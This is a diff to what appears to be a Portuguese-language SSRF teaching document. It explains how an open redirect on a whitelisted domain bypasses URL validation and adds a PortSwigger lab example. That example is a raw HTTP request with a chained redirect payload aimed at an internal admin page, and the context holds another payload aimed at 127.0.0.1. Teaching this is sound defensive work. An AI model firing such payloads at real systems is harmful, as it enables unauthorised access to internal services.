@@ -672,7 +672,19 @@ Se o backend valida estritamente a URL contra uma whitelist de domínios permiti
 ```
 http://alvo.com/fetch?url=https://parceiro.com/redirect?to=http://127.0.0.1:3306
 ```
-Se a biblioteca cliente tiver o redirecionamento automático ativado (`CURLOPT_FOLLOWLOCATION = true`), o backend aprova a requisição inicial e é conduzido pelo cabeçalho `Location: 302` diretamente para a intranet.
+Se a biblioteca cliente tiver o redirecionamento automático ativado (`CURLOPT_FOLLOWLOCATION = true`), o backend aprova a requisição inicial (já que o domínio bate com a whitelist) e é conduzido pelo cabeçalho `Location: 302` diretamente para a intranet, **sem submeter o novo destino ao filtro de validação**.
+
+> **Exemplo prático (PortSwigger Lab):**
+> O parâmetro `stockApi` exige URLs do domínio `weliketoshop.net`. A rota interna `/product/nextProduct` aceita o parâmetro `path` e devolve um redirect sem validação:
+> ```http
+> POST /product/stock HTTP/1.1
+> Host: weliketoshop.net
+> Content-Type: application/x-www-form-urlencoded
+> 
+> stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+> ```
+> O validador checa apenas o prefixo permitido, o cliente HTTP interno segue o `302 Found` e entrega a tela administrativa da intranet.
+
 
 ##### 4. Inconsistências de Parser de URL (RFC 3986 vs Browsers)
 Diferentes parsers tratam caracteres especiais de forma discordante:
